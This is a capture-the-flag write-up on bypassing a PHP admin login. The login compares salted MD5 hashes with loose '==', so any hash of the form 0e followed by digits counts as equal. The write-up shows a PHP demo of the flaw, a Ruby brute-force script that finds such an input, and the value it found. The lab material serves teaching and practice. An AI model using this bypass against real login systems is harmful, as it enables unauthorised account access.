Description:

>  Students have developed a new admin login technique. I doubt that it's secure, but the hash isn't crackable. I don't know where the problem is...

It was a php 0ep[0-9] bug.

Sans got a very detailed write-ip

https://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing

It pretty much works this way.

```
$ cat >bahhumhubbug.php
 <?php
  if (md5('240610708') == md5('QNKCDZO')) {  print "Yes, these are the same values.\n"; }
 ?>
$ php bahhumhubbug.php
```

By looking at the original md5, this is how it should go.

> md5(md5($str) . "SALT")

Quick and dirty ruby script.

```
!#/use/bin/ruby

require 'digest/md5'

loop do

	o =  [('a'..'z'),('A'..'Z')].map{|i| i.to_a}.flatten
	answer  =  (0...8).map{ o[rand(o.length)]  }.join

	befsalt = (Digest::MD5.hexdigest(answer)) + "SALT"
	aftersalt = (Digest::MD5.hexdigest(befsalt))

	puts aftersalt + " : " + answer

end
```

This is how i run it.

```
$ ruby sol.rb | grep '^0e[0-9]\{30\}'
```

It returns.
> 0e771843551973161572593952401549 : dLTmTjWe

Back to the web. Login, we got the flag.
